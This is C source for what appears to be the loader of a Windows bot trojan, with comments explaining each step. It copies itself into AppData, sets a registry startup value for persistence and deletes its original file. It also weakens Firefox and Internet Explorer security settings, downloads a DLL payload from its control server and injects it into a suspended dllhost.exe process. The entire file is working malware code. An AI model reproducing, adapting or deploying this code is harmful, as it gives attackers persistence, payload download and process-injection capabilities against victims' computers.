#pragma comment(linker, "/ENTRY:Entry")

#include "..\Common.h"

#define RUN_DEBUG FALSE

// install the bot on pc
// path is the path to current bots executable file
static void Install(char *path)
{
   // melt
   char temp[MAX_PATH];
   // put the path to the file with name botid in temp folder in temp buffer
   GetTempPathBotPrefix(temp);
   // crate this file
   HANDLE hFile = Funcs::pCreateFileA
   (
      temp, 
      GENERIC_WRITE, 
      0, 
      NULL, 
      CREATE_ALWAYS, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );
   DWORD written;
   // write there the path to current bots PE file (this file is used by melt function in Bot.cpp to delete this PE file)
   Funcs::pWriteFile(hFile, path, Funcs::pLstrlenA(path), &written, NULL);
   Funcs::pCloseHandle(hFile);
   //end melt

   char installPath[MAX_PATH] = { 0 };
   // get the path of appdata + botid folder + botid exe
   GetInstallPath(installPath);
   // copy itself there
   Funcs::pCopyFileA(path, installPath, FALSE);
   // put itself in startup registry branch in HKCU
   SetStartupValue(installPath);

   STARTUPINFOA        startupInfo = { 0 };
   PROCESS_INFORMATION processInfo = { 0 };

   startupInfo.cb = sizeof(startupInfo);

   // run previously copied file in appdata
   Funcs::pCreateProcessA(installPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}


// download and execute main payload
static void Run()
{
   // replace prefs.js file
   SetFirefoxPrefs();
   // edit registry values responsible for IE safety
   DisableMultiProcessesAndProtectedModeIe();
   // initialize critical section respponsible for http communication
   InitPanelRequest();
   BYTE *mainPluginPe = NULL;
   
   // download x86 dll
   GetDlls(&mainPluginPe, NULL, FALSE);

   char dllhostPath[MAX_PATH] = { 0 };
   
   // get system folder
   Funcs::pSHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, dllhostPath);

   // get path to dllhost.exe
   Funcs::pLstrcatA(dllhostPath, Strs::fileDiv);
   Funcs::pLstrcatA(dllhostPath, Strs::dllhostExe);

   STARTUPINFOA        startupInfo = { 0 };
   PROCESS_INFORMATION processInfo = { 0 };

   startupInfo.cb = sizeof(startupInfo);

   // run dllhost.exe
   Funcs::pCreateProcessA(dllhostPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo); 
   // inject downloaded dll in dllhost.exe (always x86)
   InjectDll(mainPluginPe, processInfo.hProcess, FALSE);
}


// entry point of loader.exe
void Entry()
{
   // initialize strings and functions
   InitApi();
   char  botId  [BOT_ID_LEN] = { 0 };
   char  exePath[MAX_PATH]   = { 0 };
   char *exeName;
   GetBotId(botId);
   // check if the process already exists
   HANDLE hMutex = Funcs::pCreateMutexA(NULL, TRUE, botId);
   if(Funcs::pGetLastError() == ERROR_ALREADY_EXISTS)
      Funcs::pExitProcess(0);
   Funcs::pReleaseMutex(hMutex);
   Funcs::pCloseHandle(hMutex);
#if(RUN_DEBUG)
   Run();
#else
   // get path to current exe
   Funcs::pGetModuleFileNameA(NULL, exePath, MAX_PATH);
   // get name of current exe
   exeName = Funcs::pPathFindFileNameA(exePath);
   // check if the bot already installed by comparing its name and botid
   if(Funcs::pStrncmp(botId, exeName, Funcs::pLstrlenA(botId)) != 0)
      // first launch
      Install(exePath);
   else
      // other launches
      Run();
#endif
   Funcs::pExitProcess(0);
}
